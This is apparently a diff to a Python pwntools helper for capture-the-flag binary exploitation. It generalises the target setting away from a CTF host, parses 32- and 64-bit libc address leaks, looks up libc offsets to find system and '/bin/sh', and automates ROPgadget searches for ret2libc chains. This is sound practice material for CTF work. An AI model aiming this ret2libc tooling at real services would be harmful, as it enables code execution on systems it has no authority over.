@@ -2,10 +2,13 @@ from pwn import *
 from LibcSearcher import *
 import os
 
-dir = 'node9.anna.nssctf.cn:24331'
-file = './attachment'
-libc_target = './libc-2.23.so'
-host,port = dir.split(':')
+dir = '目标'
+file = 'pwn文件'
+libc_target = 'libc文件'
+if dir.find(':') != -1:
+    host,port = dir.split(':')
+if dir.find(' ') != -1:
+    host,port = dir.split(' ')
 
 elf_state = True
 libc_state = True
@@ -71,16 +74,20 @@ def data_recv_text():
     p.recv()
     p.recv()
 
-def data_recv(name,type = None):
-    #only ret2libc
-    data = u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
+def data_recv(name,type):
+    if type == 64:
+        data = u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
+    if type == 32:
+        data = u32(p.recv(4))
     answer(name,data)
+    log.success('https://libc.rip/')
     return data
 
 def libc_compute(name,name_add,mode = None):
     #only ret2libc
     global system_add
     global binsh_add
+    log.success('https://libc.rip/')
     if libc_state == False or mode != 'local':
         libc = LibcSearcher(name,name_add)
         libc_base = name_add - libc.dump(name)
@@ -127,7 +134,7 @@ def get_rop(name):
     if name == 'ret':
         shell = 'ROPgadget --binary ' + file[2:] + ' --only "pop|ret"|grep ": ' + name + '"'
     else:
-        shell = 'ROPgadget --binary ' + file[2:] + ' --only "pop|ret"|grep ' + name
+        shell = 'ROPgadget --binary ' + file[2:] + ' --only "pop|ret"|grep ": pop ' + name + '"'
     try:
         result = int(os.popen(shell).readlines()[0][2:19],16)
         answer(name,result)
@@ -135,7 +142,7 @@ def get_rop(name):
     except:
         answer('error')
 
-rop_state = False
+rop_state = True
 
 if elf_state == True and rop_state == True:
     shell = 'ROPgadget --binary ' + file[2:] + ' --only "pop|ret"'
